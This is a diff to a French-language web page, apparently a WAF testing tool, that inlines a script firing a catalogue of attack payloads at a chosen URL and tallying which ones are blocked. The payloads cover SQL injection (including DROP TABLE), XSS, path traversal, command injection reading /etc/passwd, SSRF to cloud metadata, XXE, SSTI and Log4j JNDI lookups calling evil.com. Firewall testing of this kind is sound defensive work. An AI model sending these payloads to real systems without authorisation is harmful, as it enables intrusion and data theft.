@@ -111,7 +111,6 @@
                         <input type="text" id="targetUrl" 
                             class="w-full bg-dark-800 text-white px-4 py-3 rounded-lg border border-dark-700 focus:border-accent-500 focus:outline-none font-mono text-sm"
                             placeholder="URL du site à tester">
-                        <p class="text-dark-500 text-xs mt-1">Par défaut : l'URL de ce site</p>
                     </div>
                     <div class="lg:col-span-4">
                         <label class="block text-dark-400 text-sm mb-2 font-medium">Méthodes HTTP</label>
@@ -277,6 +276,280 @@
         </div>
     </footer>
 
-    <script src="/tests.js"></script>
+    <script>
+    // Payloads de test WAF
+    const PAYLOADS = {
+        'SQLi': [
+            "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--", "' OR 1=1#", "admin'--",
+            "1' ORDER BY 1--", "1 UNION SELECT 1,2,3--", "' UNION SELECT NULL,NULL,NULL--",
+            "'; WAITFOR DELAY '0:0:5'--", "1' AND SLEEP(5)#",
+            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+            "'/**/OR/**/1=1--", "' OR 'x'='x", "'; DROP TABLE users--"
+        ],
+        'XSS': [
+            "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
+            "<svg onload=alert('XSS')>", "<body onload=alert('XSS')>",
+            "<input onfocus=alert('XSS') autofocus>", "<a href=javascript:alert('XSS')>click</a>",
+            "<iframe src=javascript:alert('XSS')>", "<script>alert(String.fromCharCode(88,83,83))</script>",
+            "<SCRIPT>alert('XSS')</SCRIPT>", "javascript:alert('XSS')"
+        ],
+        'Path Traversal': [
+            "../../../etc/passwd", "../../../../etc/passwd", "../../../../../../../etc/passwd",
+            "..\\..\\..\\..\\windows\\win.ini", "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "../../../etc/passwd%00",
+            "....//....//....//etc/passwd"
+        ],
+        'Command Injection': [
+            "; ls -la", "| ls -la", "& ls -la", "&& ls -la", "; cat /etc/passwd",
+            "| cat /etc/passwd", "; id", "| whoami", "$(cat /etc/passwd)", "`id`",
+            "%0a cat /etc/passwd", "; sleep 5"
+        ],
+        'SSRF': [
+            "http://127.0.0.1/", "http://localhost/", "http://[::1]/",
+            "http://169.254.169.254/", "http://169.254.169.254/latest/meta-data/",
+            "file:///etc/passwd", "http://127.0.0.1:22/", "http://2130706433/"
+        ],
+        'NoSQLi': [
+            '{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}',
+            '{"username":{"$ne":null},"password":{"$ne":null}}',
+            '{"$or":[{},{}]}', '{"$where":"1==1"}'
+        ],
+        'LFI': [
+            "php://filter/convert.base64-encode/resource=index.php",
+            "/etc/passwd", "/proc/self/environ", "../../../../etc/passwd",
+            "....//....//....//etc/passwd"
+        ],
+        'SSTI': [
+            "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{config}}",
+            "{{''.__class__.__mro__[1].__subclasses__()}}"
+        ],
+        'XXE': [
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>'
+        ],
+        'Open Redirect': [
+            "//evil.com", "///evil.com", "http://evil.com", "/\\evil.com",
+            "//evil.com/%2F..", "http://google.com@evil.com"
+        ],
+        'Sensitive Files': [
+            ".git/config", ".env", "wp-config.php", "package.json",
+            ".htaccess", "docker-compose.yml", "backup.sql"
+        ],
+        'Log4j': [
+            "${jndi:ldap://evil.com/a}", "${jndi:rmi://evil.com/a}",
+            "${${lower:j}ndi:ldap://evil.com/a}"
+        ]
+    };
+
+    let results = [];
+    let stats = { total: 0, '200': 0, '403': 0, '301': 0, 'err': 0 };
+    let isRunning = false;
+    let shouldStop = false;
+
+    // Init au chargement
+    document.addEventListener('DOMContentLoaded', function() {
+        document.getElementById('targetUrl').value = window.location.origin;
+        generateCategories();
+    });
+
+    function generateCategories() {
+        const container = document.getElementById('categories');
+        container.innerHTML = '';
+        
+        Object.keys(PAYLOADS).forEach(category => {
+            const count = PAYLOADS[category].length;
+            const label = document.createElement('label');
+            label.className = 'flex items-center gap-2 px-3 py-2 bg-dark-800 rounded-lg border border-dark-700 cursor-pointer hover:border-rose-500 transition-colors';
+            label.innerHTML = `
+                <input type="checkbox" class="category-checkbox accent-rose-500" value="${category}" checked>
+                <span class="text-white text-sm">${category}</span>
+                <span class="text-dark-500 text-xs">(${count})</span>
+            `;
+            container.appendChild(label);
+        });
+    }
+
+    function selectAllCategories() {
+        document.querySelectorAll('.category-checkbox').forEach(cb => cb.checked = true);
+    }
+
+    function deselectAllCategories() {
+        document.querySelectorAll('.category-checkbox').forEach(cb => cb.checked = false);
+    }
+
+    async function runAllTests() {
+        const targetUrl = document.getElementById('targetUrl').value.trim();
+        if (!targetUrl) {
+            alert('Veuillez entrer une URL cible');
+            return;
+        }
+
+        const methods = Array.from(document.querySelectorAll('.method-checkbox:checked')).map(cb => cb.value);
+        if (methods.length === 0) {
+            alert('Veuillez sélectionner au moins une méthode HTTP');
+            return;
+        }
+
+        const categories = Array.from(document.querySelectorAll('.category-checkbox:checked')).map(cb => cb.value);
+        if (categories.length === 0) {
+            alert('Veuillez sélectionner au moins une catégorie');
+            return;
+        }
+
+        results = [];
+        stats = { total: 0, '200': 0, '403': 0, '301': 0, 'err': 0 };
+        shouldStop = false;
+        isRunning = true;
+
+        document.getElementById('stopBtn').classList.remove('hidden');
+        document.getElementById('progressBar').classList.remove('hidden');
+
+        const tests = [];
+        categories.forEach(category => {
+            const payloads = PAYLOADS[category];
+            methods.forEach(method => {
+                payloads.forEach(payload => {
+                    tests.push({ category, method, payload });
+                });
+            });
+        });
+
+        const total = tests.length;
+        let completed = 0;
+
+        for (let i = 0; i < tests.length; i += 5) {
+            if (shouldStop) break;
+            const batch = tests.slice(i, i + 5);
+            await Promise.all(batch.map(test => runSingleTest(targetUrl, test)));
+            completed += batch.length;
+            updateProgress(completed, total);
+        }
+
+        isRunning = false;
+        document.getElementById('stopBtn').classList.add('hidden');
+        updateStats();
+    }
+
+    async function runSingleTest(baseUrl, { category, method, payload }) {
+        try {
+            let url = baseUrl;
+            let options = {
+                method: method,
+                headers: { 'X-Vuln-Type': category.toLowerCase().replace(/\s+/g, '-') }
+            };
+
+            if (category === 'Sensitive Files') {
+                url = `${baseUrl}/${payload}`;
+            } else if (method === 'GET') {
+                url = `${baseUrl}/?payload=${encodeURIComponent(payload)}`;
+            } else {
+                if (category === 'XXE') {
+                    options.headers['Content-Type'] = 'application/xml';
+                    options.body = payload;
+                } else if (payload.startsWith('{')) {
+                    options.headers['Content-Type'] = 'application/json';
+                    options.body = payload;
+                } else {
+                    options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
+                    options.body = `payload=${encodeURIComponent(payload)}`;
+                }
+            }
+
+            const response = await fetch(url, options);
+            const status = response.status;
+
+            let statusLabel = status.toString();
+            if (status >= 300 && status < 400) statusLabel = '301';
+            else if (status === 403) statusLabel = '403';
+            else if (status >= 200 && status < 300) statusLabel = '200';
+            else statusLabel = 'ERR';
+
+            results.push({
+                category, method, status: statusLabel,
+                payload: payload.substring(0, 100) + (payload.length > 100 ? '...' : '')
+            });
+
+            stats.total++;
+            stats[statusLabel] = (stats[statusLabel] || 0) + 1;
+            updateTable();
+            updateStats();
+
+        } catch (error) {
+            results.push({
+                category, method, status: 'ERR',
+                payload: payload.substring(0, 100) + (payload.length > 100 ? '...' : '')
+            });
+            stats.total++;
+            stats['err']++;
+            updateTable();
+            updateStats();
+        }
+    }
+
+    function stopTests() {
+        shouldStop = true;
+        isRunning = false;
+        document.getElementById('stopBtn').classList.add('hidden');
+    }
+
+    function clearResults() {
+        results = [];
+        stats = { total: 0, '200': 0, '403': 0, '301': 0, 'err': 0 };
+        updateTable();
+        updateStats();
+        document.getElementById('progressBar').classList.add('hidden');
+    }
+
+    function updateProgress(current, total) {
+        document.getElementById('progress').style.width = (current / total * 100) + '%';
+        document.getElementById('progressText').textContent = `${current} / ${total}`;
+    }
+
+    function updateTable() {
+        const tbody = document.getElementById('resultsTable');
+        if (results.length === 0) {
+            tbody.innerHTML = `<tr><td colspan="4" class="py-12 text-center text-dark-400">
+                <div class="w-16 h-16 rounded-2xl bg-dark-800 flex items-center justify-center mx-auto mb-4">
+                    <i class="fas fa-flask-vial text-dark-500 text-2xl"></i>
+                </div>
+                <p>Aucun résultat</p><p class="text-dark-500 text-sm mt-1">Lancez les tests pour commencer</p>
+            </td></tr>`;
+            return;
+        }
+
+        tbody.innerHTML = results.slice(-100).reverse().map(r => `
+            <tr class="hover:bg-dark-800/50 transition-colors">
+                <td class="py-3 px-6 text-white text-sm">${r.category}</td>
+                <td class="py-3 px-6"><span class="px-2 py-1 rounded-lg text-xs font-mono font-medium ${getMethodColor(r.method)}">${r.method}</span></td>
+                <td class="py-3 px-6"><span class="status-${r.status.toLowerCase()} px-2.5 py-1 rounded-lg font-mono text-xs font-medium">${r.status}</span></td>
+                <td class="py-3 px-6 text-dark-300 font-mono text-xs break-all max-w-md">${escapeHtml(r.payload)}</td>
+            </tr>
+        `).join('');
+    }
+
+    function updateStats() {
+        document.getElementById('stat-total').textContent = stats.total;
+        document.getElementById('stat-200').textContent = stats['200'] || 0;
+        document.getElementById('stat-403').textContent = stats['403'] || 0;
+        document.getElementById('stat-301').textContent = stats['301'] || 0;
+        document.getElementById('stat-err').textContent = stats['err'] || 0;
+    }
+
+    function getMethodColor(method) {
+        const colors = {
+            'GET': 'bg-blue-500/20 text-blue-400',
+            'POST': 'bg-emerald-500/20 text-emerald-400',
+            'PUT': 'bg-amber-500/20 text-amber-400',
+            'DELETE': 'bg-rose-500/20 text-rose-400'
+        };
+        return colors[method] || 'bg-dark-600 text-dark-300';
+    }
+
+    function escapeHtml(text) {
+        const div = document.createElement('div');
+        div.textContent = text;
+        return div.innerHTML;
+    }
+    </script>
 </body>
 </html>
